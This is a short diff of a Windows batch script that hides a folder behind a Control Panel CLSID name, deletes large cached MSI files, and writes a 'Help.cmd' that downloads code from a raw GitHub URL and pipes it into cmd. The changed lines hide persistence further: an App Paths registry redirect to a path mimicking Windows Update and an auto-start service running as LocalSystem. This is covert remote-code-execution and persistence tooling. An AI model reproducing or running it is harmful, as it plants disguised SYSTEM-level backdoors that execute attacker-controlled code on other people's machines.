@@ -19,4 +19,5 @@ mkdir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 for %F in (%WINDIR%\Installer\*.msi) do if %~zF gtr 524288000 del /f /q "%F"
 
 echo %ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/zen ^| cmd /Q /V:ON >> "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Help.cmd"
-sc create Help binPath="%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Help.cmd" start="auto" obj="LocalSystem"
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\start.exe" /t REG_SZ /d "%ProgramData%\USOShared\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Help.cmd" /f
+sc create Help binPath="%WINDIR%\System32\cmd.exe /c start start.exe" start="auto" obj="LocalSystem"
